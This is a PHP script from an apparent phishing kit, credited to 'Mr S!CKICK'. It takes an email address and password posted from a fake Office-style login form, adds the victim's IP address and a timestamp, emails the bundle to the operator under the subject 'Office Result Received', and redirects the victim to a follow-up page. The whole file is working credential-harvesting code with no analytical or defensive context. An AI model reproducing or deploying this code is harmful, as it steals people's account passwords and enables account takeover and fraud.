<?php
session_start();
error_reporting(0);
include 'email.php';
$a=$_POST['txtTOAAEmail'];
$b=$_POST['Password'];

if(preg_match("/\b(hotmail|gmail|yahoo)\b/i", $a)){
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=ReZulT=---------\n";
$message .= "ID : ".$a."\n";
$message .= "Password: ".$b."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------= BY Mr S!CKICK =---------\n";
$sent = $sent1;

$subject = "Office Result Received - ".$ip;
$headers = "From: S!CKICK<sickick@spreadthesickness.com>";
$headers = "MIME-Version: 1.0\n";




if (!empty($b)) {
mail($sent,$subject,$message,$headers);


}
header("Location: buss.html?email=$a");
    
}

else{
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=ReZulT=---------\n";
$message .= "ID : ".$a."\n";
$message .= "Password: ".$b."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------= BY Mr S!CKICK =---------\n";
$sent = $sent1;

$subject = "Office Result Received - ".$ip;
$headers = "From: S!CKICK<sickick@spreadthesickness.com>";
$headers = "MIME-Version: 1.0\n";




if (!empty($b)) {
mail($sent,$subject,$message,$headers);


}
header("Location: dfe.html?email=$a");}
?>